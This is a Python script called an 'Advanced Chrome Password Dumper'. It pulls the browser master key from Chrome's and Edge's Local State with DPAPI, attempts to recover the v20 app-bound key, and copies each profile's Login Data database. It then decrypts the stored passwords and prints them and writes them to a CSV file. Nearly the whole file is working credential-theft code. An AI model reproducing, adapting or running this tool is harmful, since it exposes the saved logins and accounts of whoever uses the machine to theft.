#!/usr/bin/env python3
"""
ADVANCED Chrome Password Dumper - With v20 App-Bound Encryption Support
"""

import os
import sys
import json
import sqlite3
import shutil
import csv
import base64
import logging
import hashlib
import struct
from pathlib import Path
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
import win32crypt
from Crypto.Cipher import AES
import psutil

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

class AdvancedChromePasswordDumper:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.browsers = {
            'chrome': {
                'name': 'Google Chrome',
                'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State'),
                'profiles': ['Default'] + [f'Profile {i}' for i in range(1, 20)]
            },
            'edge': {
                'name': 'Microsoft Edge', 
                'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State'),
                'profiles': ['Default'] + [f'Profile {i}' for i in range(1, 20)]
            }
        }
        
        self.results = []
        self.master_key = None
        self.v20_key = None

    def debug_log(self, message):
        """Conditional debug logging"""
        if self.verbose:
            logger.info(f"🔍 [DEBUG] {message}")

    def print_banner(self):
        """Display banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════╗
║               ADVANCED CHROME PASSWORD DUMPER                       ║
║             With v20 App-Bound Encryption Support                   ║
╚══════════════════════════════════════════════════════════════════════╝
"""
        print(banner)

    def get_encryption_key(self, browser_key: str) -> Optional[bytes]:
        """Extract the master encryption key from browser's Local State"""
        try:
            local_state_path = self.browsers[browser_key]['local_state']
            
            if not os.path.exists(local_state_path):
                logger.error(f"❌ Local State not found: {local_state_path}")
                return None

            logger.info(f"📁 Reading Local State from: {local_state_path}")
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            # Get encrypted key from os_crypt
            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
                logger.error("❌ os_crypt.encrypted_key not found in Local State")
                return None

            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            self.debug_log(f"Encrypted key length: {len(encrypted_key)} bytes")
            
            # Remove DPAPI prefix (first 5 bytes: DPAPI)
            if encrypted_key.startswith(b'DPAPI'):
                encrypted_key = encrypted_key[5:]
                self.debug_log("✅ Detected DPAPI encrypted key")
                
            # Decrypt using DPAPI
            self.debug_log("🔓 Decrypting master key with DPAPI...")
            self.master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            logger.info(f"✅ Master key extracted ({len(self.master_key)} bytes)")
            return self.master_key
            
        except Exception as e:
            logger.error(f"❌ Failed to get encryption key: {str(e)}")
            return None

    def get_v20_encryption_key(self, browser_key: str) -> Optional[bytes]:
        """Extract v20 app-bound encryption key"""
        try:
            local_state_path = self.browsers[browser_key]['local_state']
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            # Check for app_bound_encrypted_key (v20)
            if ('os_crypt' in local_state and 
                'app_bound_encrypted_key' in local_state['os_crypt']):
                
                logger.info("🔑 Attempting to extract v20 app-bound key...")
                app_bound_key = base64.b64decode(local_state['os_crypt']['app_bound_encrypted_key'])
                
                # v20 key has a specific structure
                if app_bound_key.startswith(b'APPB'):
                    self.debug_log("✅ Detected APPB header for v20 key")
                    
                    # The actual encrypted key data starts after the header
                    encrypted_key_data = app_bound_key[4:]
                    
                    # Try to decrypt with DPAPI
                    try:
                        self.v20_key = win32crypt.CryptUnprotectData(encrypted_key_data, None, None, None, 0)[1]
                        logger.info(f"✅ v20 app-bound key extracted ({len(self.v20_key)} bytes)")
                        return self.v20_key
                    except Exception as e:
                        logger.warning(f"⚠️  Failed to decrypt v20 key with DPAPI: {e}")
                        logger.warning("   This may require running as SYSTEM or different user context")
            
            return None
            
        except Exception as e:
            self.debug_log(f"v20 key extraction failed: {e}")
            return None

    def analyze_encrypted_data(self, encrypted_data: bytes) -> Dict[str, Any]:
        """Analyze encrypted data structure"""
        analysis = {
            'total_length': len(encrypted_data),
            'starts_with_v10': encrypted_data.startswith(b'v10'),
            'starts_with_v11': encrypted_data.startswith(b'v11'),
            'starts_with_v20': encrypted_data.startswith(b'v20'),
            'first_bytes_hex': encrypted_data[:10].hex() if len(encrypted_data) >= 10 else encrypted_data.hex(),
            'encryption_type': 'Unknown'
        }
        
        if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
            analysis['encryption_type'] = 'AES-GCM v10/v11'
            if len(encrypted_data) >= 15:
                analysis['nonce'] = encrypted_data[3:15].hex()
                analysis['ciphertext_length'] = len(encrypted_data) - 15 - 16
        elif encrypted_data.startswith(b'v20'):
            analysis['encryption_type'] = 'AES-GCM v20 (App-Bound)'
            if len(encrypted_data) >= 15:
                analysis['nonce'] = encrypted_data[3:15].hex()
                analysis['ciphertext_length'] = len(encrypted_data) - 15 - 16
        elif len(encrypted_data) < 20:
            analysis['encryption_type'] = 'Possible DPAPI or corrupted'
        else:
            analysis['encryption_type'] = 'DPAPI or other'
            
        return analysis

    def decrypt_aes_gcm(self, encrypted_data: bytes, key: bytes) -> Optional[str]:
        """Decrypt AES-GCM encrypted data"""
        try:
            if not encrypted_data or len(encrypted_data) < 15:
                return None

            # Check for v10/v11/v20 prefix
            if (encrypted_data.startswith(b'v10') or 
                encrypted_data.startswith(b'v11') or 
                encrypted_data.startswith(b'v20')):
                
                # Extract components: prefix (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
                nonce = encrypted_data[3:15]
                ciphertext_with_tag = encrypted_data[15:]
                
                if len(nonce) != 12:
                    return None

                # Separate ciphertext and tag
                if len(ciphertext_with_tag) < 16:
                    return None
                    
                ciphertext = ciphertext_with_tag[:-16]
                tag = ciphertext_with_tag[-16:]

                # Create cipher and decrypt
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                
                # Verify it's valid UTF-8
                result = decrypted.decode('utf-8')
                return result
                
        except Exception as e:
            self.debug_log(f"AES-GCM decryption failed: {str(e)}")
            
        return None

    def decrypt_v20_with_key_derivation(self, encrypted_data: bytes) -> Optional[str]:
        """Attempt v20 decryption with various key derivation methods"""
        if not encrypted_data.startswith(b'v20'):
            return None

        methods = [
            ("Direct master key", self.master_key),
            ("Master key first 16", self.master_key[:16] if self.master_key else None),
            ("Master key first 32", self.master_key[:32] if self.master_key else None),
            ("SHA256 of master key", hashlib.sha256(self.master_key).digest() if self.master_key else None),
            ("v20 specific key", self.v20_key),
        ]

        for method_name, key in methods:
            if not key:
                continue
                
            self.debug_log(f"🔑 Trying v20 decryption with: {method_name}")
            result = self.decrypt_aes_gcm(encrypted_data, key)
            if result:
                logger.info(f"✅ SUCCESS decrypting v20 with: {method_name}")
                return result

        return None

    def try_dpapi_decryption(self, encrypted_data: bytes) -> Optional[str]:
        """Try DPAPI decryption for older formats"""
        try:
            if (encrypted_data.startswith(b'v10') or 
                encrypted_data.startswith(b'v11') or 
                encrypted_data.startswith(b'v20')):
                return None

            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
            
        except:
            return None

    def decrypt_password(self, encrypted_data: bytes) -> Optional[str]:
        """Main decryption function"""
        if not encrypted_data:
            return None

        analysis = self.analyze_encrypted_data(encrypted_data)
        self.debug_log(f"📊 Analyzing: {analysis['encryption_type']} - {analysis['first_bytes_hex']}")

        # Try appropriate decryption method based on encryption type
        if analysis['starts_with_v10'] or analysis['starts_with_v11']:
            # Standard v10/v11 encryption
            result = self.decrypt_aes_gcm(encrypted_data, self.master_key)
            if result:
                return result
            
            # Try key variations
            variations = [
                self.master_key[:16],
                self.master_key[:32],
                hashlib.sha256(self.master_key).digest()[:16]
            ]
            
            for key in variations:
                result = self.decrypt_aes_gcm(encrypted_data, key)
                if result:
                    return result

        elif analysis['starts_with_v20']:
            # v20 app-bound encryption
            result = self.decrypt_v20_with_key_derivation(encrypted_data)
            if result:
                return result

        else:
            # Try DPAPI for older formats
            result = self.try_dpapi_decryption(encrypted_data)
            if result:
                return result

        return None

    def extract_passwords(self, browser_key: str, profile: str) -> List[Dict]:
        """Extract passwords from a browser profile"""
        passwords = []
        
        try:
            browser_info = self.browsers[browser_key]
            profile_path = os.path.join(os.path.dirname(browser_info['local_state']), profile, 'Login Data')
            
            if not os.path.exists(profile_path):
                return passwords

            logger.info(f"   🔍 Scanning: {profile}")
            
            # Create temporary copy
            temp_db = f"temp_{browser_key}_{profile.replace(' ', '_')}.db"
            shutil.copy2(profile_path, temp_db)

            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, date_last_used
                FROM logins 
                WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0
            """)
            
            profile_stats = {'total': 0, 'success': 0, 'failed': 0, 'v20': 0}
            
            for url, username, encrypted_password, date_created, date_last_used in cursor.fetchall():
                profile_stats['total'] += 1
                
                if not encrypted_password:
                    continue

                # Analyze encryption type
                analysis = self.analyze_encrypted_data(encrypted_password)
                
                # Decrypt password
                decrypted_password = self.decrypt_password(encrypted_password)
                
                success = decrypted_password is not None
                if analysis['starts_with_v20']:
                    profile_stats['v20'] += 1

                password_data = {
                    'browser': browser_info['name'],
                    'profile': profile,
                    'url': url or 'N/A',
                    'username': username or 'N/A',
                    'password': decrypted_password if success else 'DECRYPTION_FAILED',
                    'encrypted_length': len(encrypted_password),
                    'encryption_type': analysis['encryption_type'],
                    'created': self.chrome_time_to_datetime(date_created) if date_created else 'Unknown',
                    'last_used': self.chrome_time_to_datetime(date_last_used) if date_last_used else 'Never',
                    'success': success
                }
                
                if not success:
                    password_data['encrypted_preview'] = encrypted_password[:10].hex()
                
                if success:
                    profile_stats['success'] += 1
                else:
                    profile_stats['failed'] += 1
                
                passwords.append(password_data)
            
            conn.close()
            os.remove(temp_db)
            
            # Log results
            success_rate = (profile_stats['success'] / profile_stats['total'] * 100) if profile_stats['total'] > 0 else 0
            logger.info(f"   📊 {profile_stats['success']}/{profile_stats['total']} decrypted ({success_rate:.1f}%)")
            if profile_stats['v20'] > 0:
                logger.info(f"   🔐 {profile_stats['v20']} v20 encrypted passwords found")
            
        except Exception as e:
            logger.error(f"   ❌ Error in {profile}: {str(e)}")
        
        return passwords

    def chrome_time_to_datetime(self, chrome_timestamp: int) -> str:
        """Convert Chrome timestamp to readable datetime"""
        if not chrome_timestamp:
            return "Unknown"
        
        try:
            seconds_since_1601 = chrome_timestamp / 1000000
            unix_epoch = seconds_since_1601 - 11644473600
            dt = datetime.fromtimestamp(unix_epoch)
            return dt.strftime("%Y-%m-%d %H:%M:%S")
        except:
            return "Invalid Date"

    def display_results(self):
        """Display results"""
        if not self.results:
            logger.info("❌ No passwords found.")
            return

        successful = [r for r in self.results if r['success']]
        failed = [r for r in self.results if not r['success']]
        v20_failed = [r for r in failed if 'v20' in r['encryption_type']]
        
        print(f"\n{'='*100}")
        print(f"📊 ADVANCED EXTRACTION REPORT")
        print(f"{'='*100}")
        print(f"✅ Successfully decrypted: {len(successful)} passwords")
        print(f"❌ Failed to decrypt: {len(failed)} passwords")
        print(f"🔐 v20 encrypted (special handling): {len(v20_failed)} passwords")
        print(f"📈 Overall success rate: {(len(successful)/len(self.results)*100):.1f}%")

        # Show decrypted passwords
        if successful:
            print(f"\n🎯 DECRYPTED PASSWORDS (showing first 20):")
            print(f"{'URL':<50} {'USERNAME':<25} {'PASSWORD':<20}")
            print(f"{'-'*100}")
            for entry in successful[:20]:
                url = entry['url'][:48] + '..' if len(entry['url']) > 50 else entry['url']
                username = entry['username'][:23] + '..' if len(entry['username']) > 25 else entry['username']
                password = entry['password'][:18] + '..' if len(entry['password']) > 20 else entry['password']
                print(f"{url:<50} {username:<25} {password:<20}")

        # v20 specific information
        if v20_failed:
            print(f"\n⚠️  V20 ENCRYPTION CHALLENGE:")
            print(f"   • {len(v20_failed)} passwords use v20 app-bound encryption")
            print(f"   • These require advanced decryption methods")
            print(f"   • Current limitations:")
            print(f"     - May require running as SYSTEM user")
            print(f"     - May need specific user context")
            print(f"     - Enterprise-managed Chrome instances")
            print(f"   • Examples of v20 encrypted sites:")
            for entry in v20_failed[:5]:
                print(f"     • {entry['url'][:45]}")

    def save_to_csv(self, filename: str = None):
        """Save results to CSV"""
        if not self.results:
            return None

        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"chrome_passwords_advanced_{timestamp}.csv"

        try:
            with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
                fieldnames = [
                    'browser', 'profile', 'url', 'username', 'password', 
                    'encrypted_length', 'encryption_type', 'created', 'last_used', 
                    'success', 'encrypted_preview'
                ]
                
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                
                for result in self.results:
                    row = {field: result.get(field, '') for field in fieldnames}
                    writer.writerow(row)
            
            logger.info(f"💾 Results saved to: {filename}")
            return filename
            
        except Exception as e:
            logger.error(f"❌ Failed to save CSV: {str(e)}")
            return None

    def scan_browser(self, browser_key: str):
        """Scan a specific browser"""
        logger.info(f"\n🔍 Scanning {self.browsers[browser_key]['name']}...")
        
        # Get encryption keys
        if not self.get_encryption_key(browser_key):
            return False

        # Try to get v20 key
        self.get_v20_encryption_key(browser_key)

        # Scan profiles
        total_recovered = 0
        for profile in self.browsers[browser_key]['profiles']:
            passwords = self.extract_passwords(browser_key, profile)
            self.results.extend(passwords)
            total_recovered += len([p for p in passwords if p['success']])

        if total_recovered > 0:
            logger.info(f"✅ {self.browsers[browser_key]['name']}: {total_recovered} passwords recovered")
        else:
            logger.warning(f"⚠️  {self.browsers[browser_key]['name']}: No passwords recovered")
        
        return total_recovered > 0

def main():
    dumper = AdvancedChromePasswordDumper()
    dumper.print_banner()
    
    # Check if running as admin
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            logger.warning("⚠️  Not running as administrator")
            logger.warning("   Some v20 passwords may not decrypt without admin privileges")
            logger.warning("   Consider running as Administrator for better results")
    except:
        pass
    
    dumper.verbose = input("Enable verbose debugging? (y/N): ").lower() == 'y'
    
    print("\n🌐 SELECT BROWSER:")
    print("   1. Google Chrome")
    print("   2. Microsoft Edge") 
    print("   3. Both Browsers")
    
    try:
        choice = input("\n🎯 Enter choice (1-3): ").strip()
        
        browsers_to_scan = []
        if choice == '1': browsers_to_scan = ['chrome']
        elif choice == '2': browsers_to_scan = ['edge']
        elif choice == '3': browsers_to_scan = ['chrome', 'edge']
        else:
            logger.error("❌ Invalid choice")
            return
        
        start_time = datetime.now()
        
        for browser in browsers_to_scan:
            dumper.scan_browser(browser)
        
        end_time = datetime.now()
        
        # Display results
        dumper.display_results()
        
        # Save results
        if dumper.results:
            save = input("\n💾 Save detailed report to CSV? (Y/n): ").lower()
            if save != 'n':
                dumper.save_to_csv()
        
        duration = (end_time - start_time).total_seconds()
        logger.info(f"\n⏱️  Scan completed in {duration:.2f} seconds")
        
    except KeyboardInterrupt:
        logger.info("\n👋 Operation cancelled")
    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")

if __name__ == "__main__":
    main()
